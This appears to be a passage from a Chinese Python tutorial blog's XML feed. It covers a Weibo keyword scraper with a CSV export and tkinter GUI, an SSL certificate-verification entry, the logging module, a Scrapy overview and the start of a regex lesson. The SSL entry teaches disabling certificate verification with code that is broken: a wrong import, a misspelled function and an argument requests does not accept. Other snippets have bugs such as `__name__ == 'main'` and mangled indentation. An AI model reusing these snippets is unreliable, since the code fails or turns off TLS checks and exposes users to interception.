class="comment">#打印结果，如果返回200,则访问成功</span></span><br><span class="line">print(html)</span><br></pre></td></tr></table></figure><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/8.png"  alt="8"></p><h3 id="获取相关数据"><a href="#获取相关数据" class="headerlink" title="获取相关数据"></a>获取相关数据</h3><p>通过对网页分析，该网页获取的数据为json格式的数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line">......</span><br><span class="line"><span class="comment">#对返回结果判断，如果是200，则把数据转为json格式</span></span><br><span class="line"><span class="keyword">if</span> html.content:</span><br><span class="line">    response = html.json()</span><br></pre></td></tr></table></figure><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/9.jpg"  alt="9"></p><p>数据为字典类型</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">.......</span><br><span class="line"><span class="comment">#提取数据</span></span><br><span class="line">cards = response[<span class="string">"data"</span>][<span class="string">"cards"</span>]</span><br><span class="line">result = []</span><br><span class="line"><span class="comment">#遍历cards列表</span></span><br><span class="line"><span class="keyword">for</span> card <span class="keyword">in</span> cards:</span><br><span class="line">    <span class="comment">#判断"mblog"键是否存在该字典中</span></span><br><span class="line">mblogs = <span class="string">"mblog"</span></span><br><span class="line"><span class="keyword">if</span> mblogs <span class="keyword">in</span> card:</span><br><span class="line">        <span class="comment">#提取正文内容</span></span><br><span class="line">text = card[mblogs][<span class="string">"text"</span>]</span><br><span class="line">        <span class="comment">#对正文进行提取，利用正则表达式删除HTML标签</span></span><br><span class="line">        <span class="comment">#re.compile正则表达式的字符串创建模式对象,re.S使.匹配包括换行在内的所有字符</span></span><br><span class="line">dr = re.compile(<span class="string">r'&lt;[^&gt;]+&gt;'</span>,re.S)</span><br><span class="line">        <span class="comment">#把数据以字典的形式保存在列表中</span></span><br><span class="line">result.append(&#123;</span><br><span class="line"><span class="string">'发布时间'</span>:card[mblogs][<span class="string">"created_at"</span>],</span><br><span class="line"><span class="string">'用户id'</span>:card[mblogs][<span class="string">"user"</span>][<span class="string">"id"</span>],</span><br><span class="line"><span class="string">'用户名'</span>:card[mblogs][<span class="string">"user"</span>][<span class="string">"screen_name"</span>],</span><br><span class="line"><span class="string">'微博地址'</span>:card[mblogs][<span class="string">"user"</span>][<span class="string">"profile_url"</span>],</span><br><span class="line"><span class="string">'转发数'</span>:card[mblogs][<span class="string">"reposts_count"</span>],</span><br><span class="line"><span class="string">'评论数'</span>:card[mblogs][<span class="string">"comments_count"</span>],</span><br><span class="line"><span class="string">'点赞数'</span>:card[mblogs][<span class="string">"attitudes_count"</span>],</span><br><span class="line"><span class="string">'正文'</span>:dr.sub(<span class="string">''</span>,text)&#125;)</span><br><span class="line">        print(result)</span><br></pre></td></tr></table></figure><p>查看结果</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/10.jpg"  alt="10"></p><p>获取到的数据保存到.cvs文件中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> csv <span class="keyword">import</span> DictWriter</span><br><span class="line">......</span><br><span class="line"><span class="comment">#保存文件</span></span><br><span class="line"><span class="comment">#文件的名字</span></span><br><span class="line">file_name = <span class="string">'电影.csv'</span></span><br><span class="line">header = [<span class="string">'发布时间'</span>,<span class="string">'用户id'</span>,<span class="string">'用户名'</span>,<span class="string">'微博地址'</span>,<span class="string">'转发数'</span>,<span class="string">'评论数'</span>,<span class="string">'点赞数'</span>,<span class="string">'正文'</span>]</span><br><span class="line"><span class="keyword">with</span> open(file_name,<span class="string">'a'</span>,newline = <span class="string">""</span>,encoding = <span class="string">'gb18030'</span>) <span class="keyword">as</span> f:</span><br><span class="line">f_csv = DictWriter(f,header)<span class="comment">#DictWriter以字典形式写入</span></span><br><span class="line">    <span class="comment">#防止header重复写入</span></span><br><span class="line"><span class="keyword">with</span> open(file_name, <span class="string">'r'</span>, encoding=<span class="string">'gb18030'</span>, newline=<span class="string">""</span>) <span class="keyword">as</span> file:</span><br><span class="line">reader = csv.reader(file)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> [row <span class="keyword">for</span> row <span class="keyword">in</span> reader]:</span><br><span class="line">f_csv.writeheader()</span><br><span class="line">f_csv.writerows(result)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">f_csv.writerows(result)</span><br><span class="line">        <span class="comment">#延时，防止反爬机制</span></span><br><span class="line">time.sleep(<span class="number">0.1</span>)</span><br></pre></td></tr></table></figure><p>查看是否生成 “电影.csv” 文件</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/11.jpg"  alt="11"></p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/12.jpg"  alt="12"></p><p>完成程序编写。</p><h3 id="对源代码进行改进"><a href="#对源代码进行改进" class="headerlink" title="对源代码进行改进"></a>对源代码进行改进</h3><p>目前只是爬取一页的结果，以及每次搜索不同的关键词都要改源代码内容。</p><p>为了让该程序实用美观，引用tkinter建立GUI界面。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tkinter <span class="keyword">import</span> *<span class="comment">#tkinter可以快速创建GUI应用程序</span></span><br><span class="line"><span class="keyword">from</span> csv <span class="keyword">import</span> DictWriter</span><br><span class="line">......</span><br><span class="line"><span class="comment">#创建一个窗口</span></span><br><span class="line">root = Tk()</span><br><span class="line"></span><br><span class="line"><span class="comment">#设计窗口大小以及位置  宽高400*100 位置(650,400)</span></span><br><span class="line">root.geometry(<span class="string">'405x80+650+400'</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment">#设计窗口标题</span></span><br><span class="line">root.title(<span class="string">'微博搜索'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#标签控件</span></span><br><span class="line">labl1 = Label(root,text = <span class="string">'关键词:'</span>,font = (<span class="string">'华文行楷'</span>,<span class="number">18</span>))</span><br><span class="line"><span class="comment">#网格显示标签,靠左显示</span></span><br><span class="line">labl1.grid(sticky=W)</span><br><span class="line"></span><br><span class="line"><span class="comment">#输入框</span></span><br><span class="line">entry = Entry(root,font = (<span class="string">'华文行楷'</span>,<span class="number">18</span>))</span><br><span class="line"><span class="comment">#网格显示标签</span></span><br><span class="line">entry.grid(row=<span class="number">0</span>,column=<span class="number">1</span>,sticky=W)</span><br><span class="line"></span><br><span class="line"><span class="comment">#搜索按钮</span></span><br><span class="line">button = Button(root,text = <span class="string">'搜索'</span>,font = (<span class="string">'华文行楷'</span>,<span class="number">15</span>),command=sign)</span><br><span class="line"><span class="comment">#command=sign对程序进行对接</span></span><br><span class="line"><span class="comment">#网格式显示</span></span><br><span class="line">button.grid(row=<span class="number">0</span>,column=<span class="number">3</span>,sticky=E)</span><br><span class="line"></span><br><span class="line"><span class="comment">#显示窗口</span></span><br><span class="line">root.mainloop()</span><br></pre></td></tr></table></figure><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/13.png"  alt="13"></p><p>对程序改进</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign</span><span class="params">()</span>:</span></span><br><span class="line"><span class="comment">#获取输入结果</span></span><br><span class="line">key_word = entry.get()</span><br><span class="line"><span class="comment">#去除输入框的空格</span></span><br><span class="line">key_word = key_word.strip()</span><br><span class="line"><span class="comment">#判断输入是否为空</span></span><br><span class="line"><span class="keyword">if</span> key_word == <span class="string">''</span>:</span><br><span class="line"><span class="comment">#提示信息</span></span><br><span class="line">messagebox.showinfo(title = <span class="string">'提示'</span>,message = <span class="string">'请输入关键词'</span>)</span><br><span class="line">        </span><br><span class="line"><span class="comment">#构造搜索内容</span></span><br><span class="line">    <span class="keyword">else</span>：</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">'containerid'</span>:<span class="string">'100103type=1&amp;q&#123;&#125;'</span>.format(key_word),</span><br><span class="line"><span class="string">'page_type'</span>:<span class="string">'searchall'</span>,</span><br><span class="line"><span class="string">'page'</span>:i,</span><br><span class="line">&#125;</span><br><span class="line">     ......</span><br><span class="line">    </span><br><span class="line">        <span class="comment">#文件的名字</span></span><br><span class="line">        file_name = key_word + <span class="string">'.csv'</span></span><br><span class="line"></span><br><span class="line">         ......</span><br><span class="line">        <span class="comment">#显示生成文件</span></span><br><span class="line">        <span class="comment">#标签控件</span></span><br><span class="line">        labl2 = Label(root,text = <span class="string">'查询完成：&#123;&#125;'</span>.format(file_name),font = (<span class="string">'华文行楷'</span>,<span class="number">15</span>))</span><br><span class="line">        <span class="comment">#网格显示标签,靠左显示</span></span><br><span class="line">        labl2.grid(row=<span class="number">1</span>,column=<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/14.jpg"  alt="14"></p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/15.jpg"  alt="15"></p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/16.jpg"  alt="16"></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python之请求SSL证书验证</title>
      <link href="/2020/04/27/%E8%AF%B7%E6%B1%82SSL%E8%AF%81%E4%B9%A6%E9%AA%8C%E8%AF%81/"/>
      <url>/2020/04/27/%E8%AF%B7%E6%B1%82SSL%E8%AF%81%E4%B9%A6%E9%AA%8C%E8%AF%81/</url>
      
        <content type="html"><![CDATA[<h2 id="请求SSL证书验证"><a href="#请求SSL证书验证" class="headerlink" title="请求SSL证书验证"></a>请求SSL证书验证</h2><p>HTTPS请求验证SSL证书，就像web游览器一样，网站的SSL证书经过CA认证，才能正常访问，如<a href="https://www.baidu.com/" target="_blank" rel="noopener">https://www.baidu.com/</a></p><p>如果SSL认证不通过，或者操作系统不信任服务器的安全证书，比如访问12306网站：<a href="https://www.12306.cn/mormhweb/" target="_blank" rel="noopener">https://www.12306.cn/mormhweb/</a> 的时候，会警告用户证书不受信任。（12306网站证书是自己做的，没有通过CA认证）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> SSL</span><br><span class="line"><span class="comment">#忽略SSL安全认证</span></span><br><span class="line">context = ssl._create_univerified_context()</span><br><span class="line"><span class="comment">#添加到context参数里</span></span><br><span class="line">html = requests.get(url,context=context)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python之logging模块</title>
      <link href="/2020/04/27/%E6%97%A5%E5%BF%97%E8%BE%93%E5%87%BA%E2%80%94logging%E6%A8%A1%E5%9D%97/"/>
      <url>/2020/04/27/%E6%97%A5%E5%BF%97%E8%BE%93%E5%87%BA%E2%80%94logging%E6%A8%A1%E5%9D%97/</url>
      
        <content type="html"><![CDATA[<h1 id="日志输出—logging模块"><a href="#日志输出—logging模块" class="headerlink" title="日志输出—logging模块"></a>日志输出—logging模块</h1><p>logging模块是Python内置的标准模块，主要用于输出运行日志，可以设置输出日志的等级、日志保存路径、日志文件回滚等；相比print，具备如下优点：</p><ol><li>可以通过设置不同的日志等级，在release版本中只输出重要信息，而不必显示大量的调试信息；</li><li>print将所有信息都输出到标准输出中，严重影响开发者从标准输出中查看其它数据；logging则可以由开发者决定将信息输出到什么地方，以及怎么输出；</li></ol><h2 id="logging基本配置"><a href="#logging基本配置" class="headerlink" title="logging基本配置"></a>logging基本配置</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#############################  普通文件下的logging的基本设置   #########################</span></span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="comment">#设置日志的输出格式</span></span><br><span class="line">logging.basicConfig(level = logging.INFO,<span class="comment">#设置输出等级</span></span><br><span class="line">                    <span class="comment">#设置输出格式</span></span><br><span class="line">                    format = <span class="string">' %(name)s '</span></span><br><span class="line">                     <span class="string">'- %(levelname)s'</span></span><br><span class="line">                     <span class="string">' - %(message)s'</span></span><br><span class="line">                    <span class="string">'- %(asctime)s'</span>,datefmt = <span class="string">'[%d/%b%Y %H:%M:%S]'</span><span class="comment">#设置输出时间</span></span><br><span class="line">                   )</span><br><span class="line"><span class="comment">#实例化</span></span><br><span class="line">logger = logging.getLogger(__name__)</span><br><span class="line"><span class="comment">#调用logger，可在任意文件中调用</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'main'</span>:</span><br><span class="line">    logger.info(<span class="string">"Start print log"</span>)</span><br><span class="line">    logger.debug(<span class="string">"Do something"</span>)</span><br><span class="line">    logger.warning(<span class="string">"Something maybe fail."</span>)</span><br><span class="line">    logger.info(<span class="string">"Finish"</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment">############################   Scrapy下的基本设置   #################################</span></span><br><span class="line">settings中设置LOG_LEVEL=<span class="string">"WARNING"</span></span><br><span class="line">settings中设置LOG_FILE=<span class="string">"./a.log"</span><span class="comment">#设置日志保存的位置，设置后终端不会显示日志内容</span></span><br><span class="line"><span class="keyword">import</span> logging <span class="comment">#实例化logger的方式在任何文件中使用logger输出内容</span></span><br></pre></td></tr></table></figure><p>logging中可以选择很多消息级别，如：<strong>DEBUG，INFO，WARNING，ERROR，CRITICAL</strong>，通过赋予logger或者handler不同的级别，开发者就可以只输出错误信息到特定的记录文件，或者在调试时只记录调试信息</p><h3 id="logging-basicConfig函数各参数："><a href="#logging-basicConfig函数各参数：" class="headerlink" title="logging.basicConfig函数各参数："></a>logging.basicConfig函数各参数：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">logging.basicConfig函数各参数：</span><br><span class="line">filename：指定日志文件名；</span><br><span class="line"> </span><br><span class="line">filemode：和file函数意义相同，指定日志文件的打开模式，<span class="string">'w'</span>或者<span class="string">'a'</span>；</span><br><span class="line"> </span><br><span class="line">format：指定输出的格式和内容，format可以输出很多有用的信息，</span><br><span class="line"> </span><br><span class="line">datefmt：指定时间格式，同time.strftime()；</span><br><span class="line"> </span><br><span class="line">level：设置日志级别，默认为logging.WARNNING；</span><br><span class="line"> </span><br><span class="line">stream：指定将日志的输出流，可以指定输出到sys.stderr，sys.stdout或者文件，默认输出到sys.stderr，当stream和filename同时指定时，stream被忽略；</span><br></pre></td></tr></table></figure><h3 id="format定义了Logger记录的输出格式。"><a href="#format定义了Logger记录的输出格式。" class="headerlink" title="format定义了Logger记录的输出格式。"></a>format定义了Logger记录的输出格式。</h3><table><thead><tr><th>属性名称</th><th>格式</th><th>说明</th></tr></thead><tbody><tr><td>name</td><td>%(name)s</td><td>日志的名称</td></tr><tr><td>asctime</td><td>%(asctime)s</td><td>可读时间，默认格式‘2003-07-08 16:49:45,896’，逗号之后是毫秒</td></tr><tr><td>filename</td><td>%(filename)s</td><td>文件名，pathname的一部分</td></tr><tr><td>pathname</td><td>%(pathname)s</td><td>文件的全路径名称</td></tr><tr><td>funcName</td><td>%(funcName)s</td><td>调用日志多对应的方法名</td></tr><tr><td>levelname</td><td>%(levelname)s</td><td>日志的等级</td></tr><tr><td>levelno</td><td>%(levelno)s</td><td>数字化的日志等级</td></tr><tr><td>lineno</td><td>%(lineno)d</td><td>被记录日志在源码中的行数</td></tr><tr><td>module</td><td>%(module)s</td><td>模块名</td></tr><tr><td>msecs</td><td>%(msecs)d</td><td>时间中的毫秒部分</td></tr><tr><td>process</td><td>%(process)d</td><td>进程的ID</td></tr><tr><td>processName</td><td>%(processName)s</td><td>进程的名称</td></tr><tr><td>thread</td><td>%(thread)d</td><td>线程的ID</td></tr><tr><td>threadName</td><td>%(threadName)s</td><td>线程的名称</td></tr><tr><td>relativeCreated</td><td>%(relativeCreated)d</td><td>日志被创建的相对时间，以毫秒为单位</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python之Scrapy爬虫框架</title>
      <link href="/2020/04/27/Scrapy%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6/"/>
      <url>/2020/04/27/Scrapy%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="Scrapy爬虫框架"><a href="#Scrapy爬虫框架" class="headerlink" title="Scrapy爬虫框架"></a>Scrapy爬虫框架</h1><h2 id="安装Scrapy"><a href="#安装Scrapy" class="headerlink" title="安装Scrapy"></a>安装Scrapy</h2><p>pip install scrapy</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1583387366469.png"  alt="1583387366469"></p><p>安装后测试</p><p>执行 scrapy -h</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1583387522552.png"  alt="1583387522552"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">注意：</span><br><span class="line">1.在ubyntu 上安装 scrapy 之前，需要先安装以下依赖：</span><br><span class="line">sudo apt-get install python-dev python-pip libxm12-dev libxsltl-dev zlibig-dev libffi-dev，然后再通过pip install scrapy安装。</span><br><span class="line"></span><br><span class="line">2.如果在 windows 系统下，提示这个错误 ModuleNotFoundError： No module name &#39;win32api&#39;,那么使用以下命令可以解决：pip install pypiwin32</span><br></pre></td></tr></table></figure><h2 id="scrapy介绍"><a href="#scrapy介绍" class="headerlink" title="scrapy介绍"></a>scrapy介绍</h2><p>scrapy不是一个函数功能库而是 <strong>爬虫框架</strong></p><h3 id="爬虫框架"><a href="#爬虫框架" class="headerlink" title="爬虫框架"></a>爬虫框架</h3><p>爬虫框架是实现爬虫功能的一个软件结构和功能组件集合。</p><p>爬虫框架是一个半成品，能够帮助用户实现专业网络爬虫。</p><h3 id="“5-2”结构"><a href="#“5-2”结构" class="headerlink" title="“5+2”结构"></a>“5+2”结构</h3><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1583387992793.png"  alt="1583387992793"></p><h4 id="Engine（不需要用户修改）"><a href="#Engine（不需要用户修改）" class="headerlink" title="Engine（不需要用户修改）"></a>Engine（不需要用户修改）</h4><p>控制所有模块之间的数据流</p><p>根据条件触发</p><h4 id="Downloader（不需要用户修改）"><a href="#Downloader（不需要用户修改）" class="headerlink" title="Downloader（不需要用户修改）"></a>Downloader（不需要用户修改）</h4><p>根据请求下载网页</p><h4 id="Scheduler（不需要用户修改）"><a href="#Scheduler（不需要用户修改）" class="headerlink" title="Scheduler（不需要用户修改）"></a>Scheduler（不需要用户修改）</h4><p>对所有爬取请求进行调度管理</p><h4 id="Downloader-Middleware"><a href="#Downloader-Middleware" class="headerlink" title="Downloader Middleware"></a>Downloader Middleware</h4><p>目的：实施Engine、Scheduler和Downloader之间进行用户可配置的控制</p><p>功能：修改、丢弃、新增请求或响应</p><h4 id="Spider（需要用户编写配置代码）"><a href="#Spider（需要用户编写配置代码）" class="headerlink" title="Spider（需要用户编写配置代码）"></a>Spider（需要用户编写配置代码）</h4><p>解析Downloader返回的响应（Response）</p><p>产生爬取项（scraped item）</p><p>产生额外的爬取请求（Request）</p><h4 id="Item-Pipelines（需要用户编写配置代码）"><a href="#Item-Pipelines（需要用户编写配置代码）" class="headerlink" title="Item Pipelines（需要用户编写配置代码）"></a>Item Pipelines（需要用户编写配置代码）</h4><p>以流水线方式处理Spider产生的爬取项</p><p>由一组操作顺序组成，类似流水线，每个操作是一个Item Pipeline类型</p><p>可能操作不包括：清理、检验和查重爬取项中的HTML数据。将数据存储到数据库</p><h4 id="Spider-Middleware"><a href="#Spider-Middleware" class="headerlink" title="Spider Middleware"></a>Spider Middleware</h4><p>目的：对请求和爬取项的再处理</p><p>功能：修改、丢弃、新增请求或爬取项</p><h3 id="Scrapy命令行"><a href="#Scrapy命令行" class="headerlink" title="Scrapy命令行"></a>Scrapy命令行</h3><p>scrapy是为持续运行设计的专业爬虫框架，提供操作的Scrapy命令行。</p><h4 id="Scrapy命令行格式"><a href="#Scrapy命令行格式" class="headerlink" title="Scrapy命令行格式"></a>Scrapy命令行格式</h4><p>** &gt; scrapy &lt; command &gt; [options] [args]</p><p>command：Scrapy命令</p><h4 id="Scrapy常用命令"><a href="#Scrapy常用命令" class="headerlink" title="Scrapy常用命令"></a>Scrapy常用命令</h4><table><thead><tr><th>命令</th><th>说明</th><th>格式</th></tr></thead><tbody><tr><td>startproject</td><td>创建一个新工程</td><td>scrapy startproject &lt; name &gt; [dir]</td></tr><tr><td>genspider</td><td>创建一个爬虫</td><td>scrapy genspider [options] &lt; name &gt; &lt; domian &gt;</td></tr><tr><td>settings</td><td>获取爬虫配置信息</td><td>scrapy settings [options]</td></tr><tr><td>crawl</td><td>运行一个爬虫</td><td>scrapy crawl &lt; spider &gt;</td></tr><tr><td>list</td><td>列出工程中所有爬虫</td><td>scrapy list</td></tr><tr><td>shell</td><td>启动URL调试命令行</td><td>scrapy shell [url]</td></tr></tbody></table><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><h3 id="演示HTML地址"><a href="#演示HTML地址" class="headerlink" title="演示HTML地址"></a>演示HTML地址</h3><p>演示HTML页面地址：<a href="http://python123.io/ws/demo.html" target="_blank" rel="noopener">http://python123.io/ws/demo.html</a></p><p>文件名称：demo.html</p><h3 id="产生步骤"><a href="#产生步骤" class="headerlink" title="产生步骤"></a>产生步骤</h3><h4 id="步骤1：建立以Scrapy爬虫工程"><a href="#步骤1：建立以Scrapy爬虫工程" class="headerlink" title="步骤1：建立以Scrapy爬虫工程"></a>步骤1：建立以Scrapy爬虫工程</h4><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1583390529399.png"  alt="1583390529399"></p><h5 id="生成的工程目录"><a href="#生成的工程目录" class="headerlink" title="生成的工程目录"></a>生成的工程目录</h5><p>python123demo/        外层目录</p><ul><li>scrapy.cfg                    部署Scrapy爬虫的配置文件</li><li>python123demo/        Scrapy框架的用户自定义python代码<ul><li>_ init _.py                        初始化脚本    </li><li>items.py                        Items代码模板,用来存放爬取下来的数据模型（继承类）</li><li>middlewares.py            Middlewares代码模板，用来存放各种中间件的文件（继承类）</li><li>pipelines .py                    Piplines代码模板，用来将items的模型存储到本地磁盘中（继承类）</li><li>settings.py                    Scrapy爬虫的配置文件，爬虫的配置信息（比如请求头、多久发送一次请求、ip代理池等）</li><li>spiders/                        Spiders代码模板目录，所以爬虫都需存放在这里（继承类）<ul><li>_ init _.py                初始文件，无需修改</li><li>_ pycache_/          缓存目录，无需修改</li></ul></li></ul></li></ul><h4 id="步骤2：在工程中产生一个Scrapy爬虫"><a href="#步骤2：在工程中产生一个Scrapy爬虫" class="headerlink" title="步骤2：在工程中产生一个Scrapy爬虫"></a>步骤2：在工程中产生一个Scrapy爬虫</h4><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1583391541994.png"  alt="1583391541994"></p><p>在\python123demo\spiders目录下生产demo.py文件</p><h5 id="demo-py文件"><a href="#demo-py文件" class="headerlink" title="demo.py文件"></a>demo.py文件</h5><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1583391885587.png"  alt="1583391885587"></p><p>parse()用于处理响应，解析内容形成字典，发现新的URL爬取请求。</p><h4 id="步骤3：配置产生的spider爬虫"><a href="#步骤3：配置产生的spider爬虫" class="headerlink" title="步骤3：配置产生的spider爬虫"></a>步骤3：配置产生的spider爬虫</h4><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1583392533280.png"  alt="1583392533280"></p><h4 id="步骤4：运行爬虫，获取网页"><a href="#步骤4：运行爬虫，获取网页" class="headerlink" title="步骤4：运行爬虫，获取网页"></a>步骤4：运行爬虫，获取网页</h4><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1583392655796.png"  alt="1583392655796"></p>]]></content>
      
      
      <categories>
          
          <category> python - Scrapy爬虫框架 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python - Scrapy爬虫框架 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python之正则表达式</title>
      <link href="/2020/04/27/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
      <url>/2020/04/27/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>regular expression     regex    RE</p><p><strong>正则表达式是用来简洁表达一组字符串的表达式</strong>。</p><ul><li>通用的字符串表达框架</li><li>简洁表达一组字符串的表达式</li><li>针对字符串吊打“简洁“和”特这“思想的工具</li><li>判断某字符串的特征归属</li></ul><p><strong>正则表达式在文本处理</strong></p><ul><li>表达文本类型的特征（病毒、入侵）</li><li>同时查找或替换一组字符串</li><li>匹配字符串的全部或部分</li></ul><p><strong>正则表达式的使用</strong></p><ul><li>编译：将符合正则表达式语法的字符串转换成为正则表达式特征</li></ul><p>例子：</p><p>‘PY’开头</p><p>后续存在不多于10个字符</p><p>后续字符不能是’p’ 或者 ‘Y’</p><p>​    ‘PYABC’    √</p><p>​    ‘PYKXYZ’    ×</p><p>正则表达式：PY[ ^PY ]{0,10}</p><h2 id="正则表达式的语法"><a href="#正则表达式的语法" class="headerlink" title="正则表达式的语法"></a>正则表达式的语法</h2><p><strong>正则表达式语法由字符和操作符构成</strong></p><p><strong>P(Y|YT|YTH|YTHO)?N</strong></p><h3 id="正则表达式常用操作符"><a href="#正则表达式常用操作符" class="headerlink" 